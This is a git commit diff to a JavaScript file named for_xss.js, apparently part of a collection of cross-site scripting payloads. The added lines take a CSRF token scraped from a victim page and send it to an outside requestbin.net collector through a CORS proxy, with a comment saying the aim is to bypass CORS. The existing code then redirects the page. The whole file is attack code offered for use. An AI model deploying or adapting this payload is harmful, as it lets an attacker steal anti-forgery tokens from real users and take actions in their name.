c35ad01f5e1edc9a4ed728b36dbc1b7ec9e5d3db
Lam Nguyen <60765640+kiven7299@users.noreply.github.com>
2020-06-03 11:56:31 +0700

    Update for_xss.js

--- JS/for_xss.js
+++ JS/for_xss.js
@@ -14,6 +14,9 @@ var parser = new DOMParser();
 var xmlDoc = parser.parseFromString(response1, 'text/html'); //Firefox: text/html, Chrome: text/xml
 var token = xmlDoc.querySelector('<selector for csrf token>').name;
 
+//Send token, bypass CORS
+xhttp.open("GET", "https://cors-anywhere.herokuapp.com/http://" + token + ".3bdafcbfdbe622c26e7d.d.requestbin.net");
+xhttp.send();
 
 /* redirect */
 <meta http-equiv="refresh" content="0;URL=http://google.com">
